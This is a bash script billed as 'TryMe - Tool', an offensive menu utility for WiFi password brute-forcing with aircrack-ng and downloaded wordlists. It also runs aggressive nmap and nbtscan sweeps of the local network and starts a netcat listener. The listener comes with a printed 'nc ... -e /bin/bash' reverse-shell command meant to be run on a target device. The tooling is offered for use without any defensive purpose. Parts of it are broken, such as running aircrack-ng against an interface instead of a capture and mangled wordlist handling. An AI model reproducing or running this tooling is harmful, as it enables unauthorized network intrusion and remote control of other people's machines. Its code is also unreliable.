#!/bin/bash

# Script Name: tryme_linux
# Developer: Suleiman Yahaya Garo aka Garogenius

# Function to install dependencies for Linux
function install_dependencies() {
    echo "Detected Linux. Installing dependencies..." | lolcat
    # sudo apt update -y
    sudo apt install aircrack-ng nmap wget hydra lolcat figlet netcat nbtscan -y
}

# Check for root privileges
function check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "Please run as root." | lolcat
        exit 1
    fi
}

# Install dependencies and check for root
check_root
install_dependencies

# Display Banner
figlet "TryMe - Tool" | lolcat
echo "Developed by Suleiman Yahaya Garo aka Garogenius" | lolcat

# Function to display results in a box format
function display_box() {
    echo -e "\e[1;33m+--------------------+\e[0m"
    echo -e "\e[1;33m|   RESULT OUTPUT    |\e[0m"
    echo -e "\e[1;33m+--------------------+\e[0m"
    echo -e "$1" | lolcat
    echo -e "\e[1;33m+--------------------+\e[0m"
}

# Function to select and download wordlist
function select_wordlist() {
    echo "Select a wordlist to download:" | lolcat
    PS3="Enter your choice (1-3): "
    options=("rockyou.txt (Large, Common)" "crackstation.txt.gz (Very Large, Comprehensive)" "top-20-common-SSH-passwords.txt (Small, Fast)")
    select opt in "${options[@]}"; do
        case $REPLY in
            1) wordlist_url="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"; break ;;
            2) wordlist_url="https://crackstation.net/files/crackstation.txt.gz"; break ;;
            3) wordlist_url="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"; break ;;
            *) echo "Invalid option, please try again." ;;
        esac
    done
    echo "Downloading wordlist..." | lolcat
    wget -O /tmp/wordlist.txt "$wordlist_url"

    if [[ "$wordlist_url" == *.gz ]]; then
        echo "Decompressing wordlist..." | lolcat
        gunzip /tmp/wordlist.txt.gz
    fi
    echo "/tmp/wordlist.txt"
}

# Function to search for WiFi networks (Linux only)
function search_networks() {
    echo "Searching for available networks..." | lolcat
    nmcli device wifi list | lolcat
}

# Function to brute-force WiFi networks using aircrack-ng
function brute_force_wifi() {
    echo "Attempting to brute-force WiFi network..." | lolcat
    read -p "Enter target BSSID: " bssid
    read -p "Enter interface (e.g., wlan0): " iface

    # Select and download wordlist
    wordlist_path=$(select_wordlist)

    echo "Starting aircrack-ng brute force..." | lolcat
    aircrack-ng -b "$bssid" -w "$wordlist_path" "$iface" > aircrack_output.txt

    # Check if aircrack found the password
    if grep -q "KEY FOUND!" aircrack_output.txt; then
        password=$(grep "KEY FOUND!" aircrack_output.txt | awk '{print $4}')
        result="WiFi Password found: $password"
    else
        result="WiFi Password not found."
    fi

    display_box "$result"
}

# Function to list connected devices (IP, MAC, device names, models)
function connected_devices() {
    echo "Listing devices connected to the network..." | lolcat
    gateway_ip=$(ip route | grep default | awk '{print $3}')
    echo "Scanning network $gateway_ip/24 for devices..." | lolcat

    # Use nbtscan for NetBIOS device name resolution
    nbtscan_result=$(nbtscan "$gateway_ip"/24)

    # Perform a detailed scan with nmap to gather device names and models
    nmap -O -sV --osscan-guess --version-intensity 5 -Pn "$gateway_ip"/24 > nmap_output.txt

    # Extract relevant information: IP, MAC, OS, and device model/name (if available)
    result=$(grep -E "Nmap scan report for|MAC Address|OS details" nmap_output.txt)
    if [[ -z "$result" ]]; then
        result="No devices found on the network."
    else
        result+="\n\nNetBIOS Scan Results:\n$nbtscan_result"
    fi

    display_box "$result"
}

# Function to toggle WiFi network (off/on)
function restart_network() {
    echo "Restarting network interface..." | lolcat
    echo "1. Turn WiFi OFF" | lolcat
    echo "2. Turn WiFi ON" | lolcat
    read -p "Choose option (1-2): " network_choice

    if [[ $network_choice -eq 1 ]]; then
        nmcli radio wifi off
        display_box "WiFi turned off."
    elif [[ $network_choice -eq 2 ]]; then
        nmcli radio wifi on
        display_box "WiFi turned on."
    else
        display_box "Invalid option!"
    fi
}

# Reverse Shell setup (for Linux)
function reverse_shell() {
    echo "Setting up reverse shell..." | lolcat
    read -p "Enter IP to connect back to (attacker's IP): " attacker_ip
    read -p "Enter port to connect (use port above 1024, e.g., 4444): " port

    if [[ "$port" -le 1024 ]]; then
        echo "Error: Please use a port number above 1024 (e.g., 4444)." | lolcat
        return
    fi

    echo "Starting listener on $attacker_ip:$port..." | lolcat
    nc -lvnp "$port" &

    # Get the target's IP to connect back to the attacker's machine
    read -p "Enter the target's IP (your Linux machine IP): " target_ip

    # Instruct the user to execute the following command on the target device to initiate the reverse shell:
    echo "Run the following command on the target device to connect back:"
    echo "nc $attacker_ip $port -e /bin/bash"
}

# Main menu loop
while true; do
    echo "*********************************************************" | lolcat
    echo "TryMe Tool - Linux" | lolcat
    echo "Developed by Suleiman Yahaya Garo aka Garogenius" | lolcat
    echo "*********************************************************" | lolcat

    echo "1. Search for WiFi Networks" | lolcat
    echo "2. Brute-force WiFi Network" | lolcat
    echo "3. List Connected Devices (IP, MAC, Name, Model)" | lolcat
    echo "4. Restart Network" | lolcat
    echo "5. Setup Reverse Shell" | lolcat
    echo "6. Exit" | lolcat
    read -p "Enter your choice: " choice

    case $choice in
        1) search_networks ;;
        2) brute_force_wifi ;;
        3) connected_devices ;;
        4) restart_network ;;
        5) reverse_shell ;;
        6) exit 0 ;;
        *) display_box "Invalid choice, please try again." ;;
    esac
done
